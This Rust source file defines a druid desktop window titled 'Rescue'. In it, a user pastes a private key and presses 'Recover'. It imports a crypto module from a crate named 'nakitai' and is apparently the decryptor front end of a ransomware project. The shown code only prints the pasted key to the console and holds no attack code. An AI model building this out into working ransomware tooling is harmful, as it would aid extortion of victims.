use std::fs::File;
use std::io::Read;
use druid::piet::InterpolationMode;
use druid::widget::{Button, FillStrat, Image, SizedBox};
use druid::{
    widget::{Flex, Label, TextBox},
    AppLauncher, Data, ImageBuf, Lens, LocalizedString, Widget, WidgetExt, WindowDesc,
};
use std::sync::Arc;
use base64::decode;
use openssl::rsa::Rsa;
use nakitai::utils::crypto;

const WINDOW_TITLE: LocalizedString<AppState> = LocalizedString::new("Rescue ( •̀ᴗ•́)و ̑̑");

#[derive(Clone, Data, Lens)]
struct AppState {
    is_decrypting: Arc<bool>,
    private_key_encoded_str: Arc<String>,
}

fn build_root_ui() -> impl Widget<AppState> {
    let png_data_raw = include_bytes!("../assets/top.png");
    let png_data = ImageBuf::from_data(png_data_raw).unwrap();
    let mut img = Image::new(png_data).fill_mode(FillStrat::Cover);
    img.set_interpolation_mode(InterpolationMode::Bilinear);

    let mut sized_img = SizedBox::new(img);
    sized_img = sized_img.fix_width(500 as f64);
    sized_img = sized_img.fix_height(200 as f64);

    let image_wrap = Flex::row()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_flex_child(sized_img, 1.0);

    let label_wrap = Flex::row()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_child(
            Label::new("Paste your private key")
                .with_line_break_mode(druid::widget::LineBreaking::WordWrap),
        );

    let button = SizedBox::new(
        Button::new("Recover")
            .on_click(|_ctx, data: &mut AppState, _env| {
                data.is_decrypting = true.into();

                println!("private_key_encoded_str => {:?}", data.private_key_encoded_str);
            })
            .disabled_if(|data: &AppState, _env| *data.is_decrypting),
    )
    .fix_height(28.0);

    let textbox_wrap = Flex::row()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_flex_child(
            TextBox::multiline()
                .with_placeholder("Paste here")
                .lens(AppState::private_key_encoded_str)
                .disabled_if(|data: &AppState, _env| *data.is_decrypting)
                .expand_width(),
            1.0,
        )
        .with_child(SizedBox::empty().fix_width(8.))
        .with_child(button);

    Flex::column()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_child(image_wrap)
        .with_flex_child(
            Flex::column()
                .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
                .with_child(label_wrap)
                .with_spacer(8.0)
                .with_child(textbox_wrap)
                //.with_child(textbox_wrap)
                .padding(8.0),
            1.0,
        )
}

fn main() -> Result<(), anyhow::Error> {
    let main_window = WindowDesc::new(build_root_ui())
        .title(WINDOW_TITLE)
        .resizable(false)
        .window_size((500., 315.));

    // create the initial app state
    let state = AppState {
        is_decrypting: false.into(),
        private_key_encoded_str: "".to_string().into(),
    };

    // start the application
    AppLauncher::with_window(main_window)
        .log_to_console()
        .launch(state)
        .expect("Failed to launch application");

    Ok(())
}
